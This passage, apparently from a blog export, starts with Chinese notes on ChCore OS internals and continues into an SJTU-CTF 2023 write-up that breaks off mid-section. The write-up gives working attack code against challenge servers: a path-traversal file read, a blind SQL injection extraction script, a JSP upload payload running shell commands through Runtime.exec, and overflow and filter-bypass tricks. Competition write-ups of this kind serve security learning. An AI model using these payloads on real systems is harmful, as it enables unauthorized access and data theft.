不需要任何头文件可以使用，用这个也能实现锁 但是这里依赖了已经存在的编译器，并不是从0写操作系统。</p>\n</li>\n</ol>\n<h2 id=\"进程间通信\"><a href=\"#进程间通信\" class=\"headerlink\" title=\"进程间通信\"></a>进程间通信</h2><h3 id=\"执行流\"><a href=\"#执行流\" class=\"headerlink\" title=\"执行流\"></a>执行流</h3><p>client先register_client，需要知道想要通信的服务端进程。</p>\n<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>\n<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>\n<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>\n<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>\n<h3 id=\"共享内存\"><a href=\"#共享内存\" class=\"headerlink\" title=\"共享内存\"></a>共享内存</h3><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>\n<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>\n<ul>\n<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>\n<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>\n</ul>\n<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>\n<ul>\n<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>\n</li>\n<li><p><code>stack_addr</code>为E-stack server thread执行用</p>\n</li>\n</ul>\n<h3 id=\"消息传递\"><a href=\"#消息传递\" class=\"headerlink\" title=\"消息传递\"></a>消息传递</h3><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>\n<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>\n<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>\n<p>以文件系统为例，共享内存布局如下</p>\n<p>msg元数据—fs_request元数据—文件数据</p>\n<h3 id=\"cap\"><a href=\"#cap\" class=\"headerlink\" title=\"cap\"></a>cap</h3><p>需要传递资源给server</p>\n<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>\n<h2 id=\"文件系统\"><a href=\"#文件系统\" class=\"headerlink\" title=\"文件系统\"></a>文件系统</h2><p>文件系统全是用户态程序</p>\n<p>File System Manager实现VFS抽象，在内存中维护一个链表，每个节点包含path和对应的文件系统server的结构体</p>\n<p>inode记录的block块号除了用连续的数组，还可用radix tree，key是page编号，value是page地址（block块号）</p>\n<h2 id=\"外设\"><a href=\"#外设\" class=\"headerlink\" title=\"外设\"></a>外设</h2><p>参考<a href=\"https://github.com/s-matyukevich/raspberry-pi-os/blob/master/docs/lesson01/rpi-os.md\">raspberry-pi-os&#x2F;rpi-os.md at master · s-matyukevich&#x2F;raspberry-pi-os · GitHub</a>及BCM2837树莓派外设手册可知，对于树莓派，硬件本身(MMU)规定了一段物理地址是专门用于访问外设的（BCM2837为0x30000000-0x3F000000）。由1.2节可知，当MMU第一次把虚拟地址翻译为物理地址后，还会通过另一个VC&#x2F;ARM MMU把物理地址翻译为总线地址。最后选择是访问主存还是外设。这里VC&#x2F;ARM MMU会把0x30000000的物理地址直接映射到0x7E000000。</p>\n<p>同时，第五章EMMC可知，EMMC寄存器基地址被规定为0x7E300000，也就是说，只要操作系统访问0x30300000的物理地址，就能做到和SD卡进行交互而非RAM。</p>\n<p>chcore先通过syscall创建pmo并映射，pmo对应的物理地址即是树莓派手册规定的用于访问外设+具体外设的地址。当访问这块物理内存时，树莓派会交由sd卡处理。同时，内存映射仍由操作系统管理，所以需要页表对应的PTE会被标记为device，使得这些页不进入缓存。</p>\n<p>进行读写等操作时，chcore会先通过mmio写一些寄存器，设置必要的参数(例如block号)，随后可以在指定内存位置进行读写(<code>EMMC_DATA</code>)。</p>\n<p>对MMIO地址使用的<code>read32</code> <code>write32</code>接口使用的地址均用<code>volatile</code>修饰，保证可以看到硬件提供的最真实的数据。</p>\n","categories":["chcore"]},{"title":"SJTU-CTF 2023 Writeup","url":"/2024/09/17/ctf/SJTU-CTF%202023%20Writeup/","content":"<h1 id=\"SJTU-CTF-2023-Writeup\"><a href=\"#SJTU-CTF-2023-Writeup\" class=\"headerlink\" title=\"SJTU-CTF 2023 Writeup\"></a>SJTU-CTF 2023 Writeup</h1><p>[TOC]</p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"flag-gallery\"><a href=\"#flag-gallery\" class=\"headerlink\" title=\"flag gallery\"></a>flag gallery</h3><p>F12看网络 可以看到请求了getflag.php?flag&#x3D;<br>尝试改参数，发现可以读其他文件 并且没有限制路径，但是根目录的flag没有权限<br><a href=\"http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php\">http://cf5cd62114f3488cb4558289c91f89fd.penguin.0ops.sjtu.cn:8080/getflag.php?flag=../../../../var/www/html/login.php</a><br>可以看到给了密码的md5哈希 最早以为这个没法碰撞，想别的思路了 比如提权 后来发现可以直接用<a href=\"https://www.somd5.com/\">https://www.somd5.com/</a> 找到密码是sjtuctf</p>\n<h3 id=\"Mimic-SQL\"><a href=\"#Mimic-SQL\" class=\"headerlink\" title=\"Mimic SQL\"></a>Mimic SQL</h3><p><code>select * from article where id=(select id from flag where flag like &#39;0%&#39;)</code> 可以根据查询到结果与否逐个爆破flag的每个字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">t</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Hello&#x27;</span> <span class=\"keyword\">in</span> t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0ops&#123;65BDC40EC5FF286E2E0B3C71BF3247D8&#125;</span></span><br><span class=\"line\">base = <span class=\"string\">&quot;http://8d5affacfc024519894c9d2345f17bdf.penguin.0ops.sjtu.cn:8080/article?id=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag_c = <span class=\"string\">&#x27;0ops&#123;&#x27;</span></span><br><span class=\"line\">real_flag = flag_c</span><br><span class=\"line\">flag = flag_c</span><br><span class=\"line\">find = <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"keyword\">not</span> find:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(c) <span class=\"keyword\">in</span> <span class=\"string\">&#x27;_%&#x27;</span>:</span><br><span class=\"line\">            flag = flag_c + <span class=\"string\">f&quot;[<span class=\"subst\">&#123;<span class=\"built_in\">chr</span>(c)&#125;</span>]&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            flag = flag_c + <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">        </span><br><span class=\"line\">        query = <span class=\"string\">f&quot;(select id from flag where flag like &#x27;<span class=\"subst\">&#123;flag&#125;</span>%&#x27;)&quot;</span></span><br><span class=\"line\">        <span class=\"comment\">#print(query)</span></span><br><span class=\"line\">        res = requests.get(base+urllib.parse.quote(query))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check(res.text):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(c)==<span class=\"string\">&#x27;&#125;&#x27;</span>:</span><br><span class=\"line\">                find = <span class=\"literal\">True</span></span><br><span class=\"line\">            flag_c = flag</span><br><span class=\"line\">            real_flag = flag_c + <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag_c)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"built_in\">print</span>(real_flag.lower())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"ezjsp\"><a href=\"#ezjsp\" class=\"headerlink\" title=\"ezjsp\"></a>ezjsp</h3><p>刚开始以为嵌入代码的标签都被过滤了 只能用el表达式 参考了这篇文章<br><a href=\"https://blog.csdn.net/qq_43147039/article/details/116885802\">一次jsp上传绕过的思考 –yzddMr6_yzddMr6的博客-CSDN博客</a><br>尝试用[‘’]绕过. 用反射代替new等<br>后来偶然发现竟然可以直接用&lt;%%&gt;注入java代码 不会被过滤 .也不会</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">    out.println(Runtime.getRuntime().exec(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;/bin/bash&quot;</span>,<span class=\"string\">&quot;-c&quot;</span>,<span class=\"string\">&quot;/readflag &gt; /usr/local/tomcat/webapps/ROOT/upload/flag.txt&quot;</span>&#125;).waitFor());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.jb51.net/article/227181.htm#_lab2_1_2\">调用java.lang.Runtime.exec的正确姿势分享_java_脚本之家 (jb51.net)</a><br><a href=\"https://blog.csdn.net/dingding_ting/article/details/121215718\">Process.waitFor()方法的返回值_永远不要矫情的博客-CSDN博客</a><br>返回0表示执行成功，然后用url读返回的地址即可拿到flag</p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"简单的RPG1\"><a href=\"#简单的RPG1\" class=\"headerlink\" title=\"简单的RPG1\"></a>简单的RPG1</h3><p>简单模拟 异或可以反推</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">b</span>():</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">stage1key=[<span class=\"number\">157</span>, <span class=\"number\">212</span>, <span class=\"number\">213</span>, <span class=\"number\">134</span>, <span class=\"number\">249</span>, <span class=\"number\">234</span>, <span class=\"number\">171</span>, <span class=\"number\">226</span>, <span class=\"number\">140</span>, <span class=\"number\">204</span>, <span class=\"number\">135</span>, <span class=\"number\">167</span>, <span class=\"number\">241</span>, <span class=\"number\">168</span>, <span class=\"number\">188</span>, <span class=\"number\">26</span>, <span class=\"number\">77</span>, <span class=\"number\">92</span>, <span class=\"number\">63</span>, <span class=\"number\">118</span>, <span class=\"number\">118</span>, <span class=\"number\">32</span>, <span class=\"number\">27</span>, <span class=\"number\">10</span>, <span class=\"number\">60</span>, <span class=\"number\">6</span>, <span class=\"number\">14</span>, <span class=\"number\">20</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">status = <span class=\"number\">0</span></span><br><span class=\"line\">choice = []</span><br><span class=\"line\"><span class=\"keyword\">while</span> status &lt; <span class=\"built_in\">len</span>(stage1key):</span><br><span class=\"line\">    choice.append((status*<span class=\"number\">9</span>)^<span class=\"number\">0x86</span>^stage1key[status])</span><br><span class=\"line\">    status += <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">status = 0</span></span><br><span class=\"line\"><span class=\"string\">while status &lt; len(stage1key):</span></span><br><span class=\"line\"><span class=\"string\">    print(choice[status]^(status*9)^0x86,stage1key[status])</span></span><br><span class=\"line\"><span class=\"string\">    status += 1</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">for c in choice:</span></span><br><span class=\"line\"><span class=\"string\">    print(chr(c))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getFlag</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data.find(<span class=\"string\">&#x27;0ops&#x27;</span>)!=-<span class=\"number\">1</span>:</span><br><span class=\"line\">        flag = data[data.find(<span class=\"string\">&#x27;0ops&#x27;</span>):]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">ssh = paramiko.SSHClient()</span><br><span class=\"line\"></span><br><span class=\"line\">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">102400</span></span><br><span class=\"line\">ssh.connect(<span class=\"string\">&#x27;111.186.57.85&#x27;</span>,<span class=\"number\">40150</span>,<span class=\"string\">&#x27;guest&#x27;</span>,<span class=\"string\">&#x27;guest&#x27;</span>)</span><br><span class=\"line\">s = ssh.invoke_shell(width=<span class=\"number\">181</span>,height=<span class=\"number\">58</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">begin</span>():</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    b()</span><br><span class=\"line\">    <span class=\"comment\">#print(dir(s))</span></span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">        s.send(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">        data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        b()</span><br><span class=\"line\">        <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;menu&#x27;)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">stage1</span>():</span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;play stage 1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> choice:</span><br><span class=\"line\">        s.send(c.to_bytes(<span class=\"number\">1</span>,<span class=\"string\">&#x27;big&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    flag1 = data[data.find(<span class=\"string\">&#x27;0ops&#x27;</span>):]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag1)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(data[:<span class=\"number\">20</span>],data[-<span class=\"number\">20</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#begin()</span></span><br><span class=\"line\"><span class=\"comment\">#stage1()</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./direction.txt&#x27;</span>)</span><br><span class=\"line\">direction = f.read().split(<span class=\"string\">&#x27;,&#x27;</span>)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">direction = [<span class=\"built_in\">int</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> direction]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(direction)</span><br><span class=\"line\"><span class=\"comment\">#print(direction)</span></span><br><span class=\"line\"><span class=\"comment\">#direction = [0 for i in range(10)]</span></span><br><span class=\"line\"><span class=\"comment\">#f = open(&#x27;direction.pkl&#x27;,&#x27;rb&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#direction = pickle.load(f)</span></span><br><span class=\"line\"><span class=\"comment\">#print(direction)</span></span><br><span class=\"line\">n2d = &#123;<span class=\"number\">0</span>:<span class=\"string\">&#x27;w&#x27;</span>,<span class=\"number\">1</span>:<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"number\">2</span>:<span class=\"string\">&#x27;s&#x27;</span>,<span class=\"number\">3</span>:<span class=\"string\">&#x27;d&#x27;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">isCorrect</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data.find(<span class=\"string\">&#x27;路口&#x27;</span>)!=-<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">stage2</span>():</span><br><span class=\"line\">    </span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    b()</span><br><span class=\"line\">    <span class=\"comment\">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;play stage 2&#x27;)</span></span><br><span class=\"line\">    s.send(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    b()</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    b()</span><br><span class=\"line\">    data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">    b()</span><br><span class=\"line\"></span><br><span class=\"line\">    fail = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    level = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> level &lt; <span class=\"number\">10</span> <span class=\"keyword\">and</span> fail &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(f&#x27;&#123;fail=&#125;&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#print(f&#x27;&#123;level=&#125;,direction=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class=\"line\">        s.send(n2d[direction[level]])</span><br><span class=\"line\">        b()</span><br><span class=\"line\"></span><br><span class=\"line\">        data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        b()</span><br><span class=\"line\">        <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#print(isCorrect(data))</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(isCorrect(data)):</span><br><span class=\"line\">            <span class=\"comment\">#print(f&#x27;d[&#123;level&#125;]=&#123;n2d[direction[level]]&#125;&#x27;)</span></span><br><span class=\"line\">            level+=<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            fail+=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class=\"line\">            <span class=\"comment\">#print(data)</span></span><br><span class=\"line\">            s.send(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">            b()</span><br><span class=\"line\">            s.recv(n)</span><br><span class=\"line\">            <span class=\"comment\">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class=\"line\">            b()</span><br><span class=\"line\">            <span class=\"comment\">#print(data[:20],data[-20:])</span></span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">            direction[level] = (direction[level]+<span class=\"number\">1</span>)%<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(level)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fail &lt; <span class=\"number\">3</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    </span><br><span class=\"line\">begin()</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"keyword\">not</span> stage2():</span><br><span class=\"line\">    <span class=\"comment\">#ssh = paramiko.SSHClient()</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span></span><br><span class=\"line\">    ssh.close()</span><br><span class=\"line\">    ssh.connect(<span class=\"string\">&#x27;111.186.57.85&#x27;</span>,<span class=\"number\">40150</span>,<span class=\"string\">&#x27;guest&#x27;</span>,<span class=\"string\">&#x27;guest&#x27;</span>)</span><br><span class=\"line\">    s = ssh.invoke_shell(width=<span class=\"number\">181</span>,height=<span class=\"number\">58</span>)</span><br><span class=\"line\">    begin()</span><br><span class=\"line\">data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">getFlag(data)</span><br><span class=\"line\">data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">getFlag(data)</span><br><span class=\"line\">data = s.recv(n).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">getFlag(data)</span><br><span class=\"line\">ssh.close()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"简单的RPG2\"><a href=\"#简单的RPG2\" class=\"headerlink\" title=\"简单的RPG2\"></a>简单的RPG2</h3><p>溢出 cost会变小</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fstream&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> num = (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">16</span>)/<span class=\"number\">50</span> ;num&lt;=<span class=\"number\">99999999</span>;num++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> cost = num*<span class=\"number\">50</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(cost &gt; <span class=\"number\">0</span> &amp;&amp; cost &lt; <span class=\"number\">10000</span>)&#123;</span><br><span class=\"line\">\t\t\tstd::cout&lt;&lt;num&lt;&lt;<span class=\"string\">&quot; &quot;</span>&lt;&lt;cost&lt;&lt;std::endl;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"简单的RPG3\"><a href=\"#简单的RPG3\" class=\"headerlink\" title=\"简单的RPG3\"></a>简单的RPG3</h3><p>随机种子是time&#x2F;10 10s重置一次 且是stage3函数开始的时候，所以只要用另一台时区一致的机器跑一样的代码即可</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">char</span> tab[<span class=\"number\">4</span>]=&#123;<span class=\"string\">&#x27;W&#x27;</span>,<span class=\"string\">&#x27;A&#x27;</span>,<span class=\"string\">&#x27;S&#x27;</span>,<span class=\"string\">&#x27;D&#x27;</span>&#125;;</span><br><span class=\"line\">        <span class=\"built_in\">srand</span>(<span class=\"built_in\">time</span>(<span class=\"number\">0</span>)/<span class=\"number\">10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span> ;i &lt; <span class=\"number\">10</span> ;i++)&#123;</span><br><span class=\"line\">                std::cout&lt;&lt;tab[<span class=\"built_in\">rand</span>()%<span class=\"number\">4</span>]&lt;&lt;<span class=\"string\">&quot;,&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        std::cout&lt;&lt;std::endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"简单的RPG4\"><a href=\"#简单的RPG4\" class=\"headerlink\" title=\"简单的RPG4\"></a>简单的RPG4</h3><p>ida 逆向</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%48s&quot;</span>,s1);</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"built_in\">memcmp</span>(s1,<span class=\"string\">&quot;your_deck/&quot;</span>,<span class=\"number\">0xA</span>uLL));</span><br><span class=\"line\"><span class=\"keyword\">for</span>(dest = s1; <span class=\"built_in\">strcpy</span>(dest,dest+<span class=\"number\">1</span>))&#123;</span><br><span class=\"line\">    dest = <span class=\"built_in\">strstr</span>(dest,<span class=\"string\">&quot;../&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!dest)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只能用your_deck 且过滤了..&#x2F;<br>但实际上每次过滤之后dest会直接移动一个位置，因此<code>.../</code>会被替换为<code>../</code> 然后找一个攻击力更高的就行了 （前两个byte）</p>\n<h3 id=\"简单的RPG5\"><a href=\"#简单的RPG5\" class=\"headerlink\" title=\"简单的RPG5\"></a>简单的RPG5</h3><p>一个表面上走不通的迷宫<br>两个迷惑的地方</p>\n<ol>\n<li>为什么输入和迷宫数据用的是同一个地址？</li>\n<li>为什么迷宫信息需要用那么复杂的方式？</li>\n</ol>\n<p>分别对应的利用点：</p>\n<ol>\n<li>scanf %s 最后会补\\0 导致覆盖1个byte的数据</li>\n<li>表面上是用一个bit存数据 节省空间 实际上覆盖1个byte的数据足以改变8个迷宫格子 打造一条通路</li>\n</ol>\n<p>exp:<code>wddddddsddddddddssddddwwddssssaassssddssddwwddwwaawwddddwwddwwddddddddssssssddssssaassssddssssssaaaaaaaaaaaaaassssssssssaaaaaassssssssddssssaassssddssddddddddddddddwwddddddddssddddddwwddddddssddddddddwwwwddddssddssddddwwwwwwwwddddssddssssssddddwwddddddddddddddssdd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>\n<h3 id=\"简单的RPG6\"><a href=\"#简单的RPG6\" class=\"headerlink\" title=\"简单的RPG6\"></a>简单的RPG6</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> v12[<span class=\"number\">128</span>];<span class=\"comment\">//[rsp+70h]</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> int8 v13;<span class=\"comment\">//[rsp+F0h]</span></span><br><span class=\"line\"><span class=\"type\">char</span> v14;<span class=\"comment\">//[rsp+F1h]</span></span><br></pre></td></tr></table></figure>\n<p>v12[128] &#x3D;&#x3D; v13<br>v12[129] 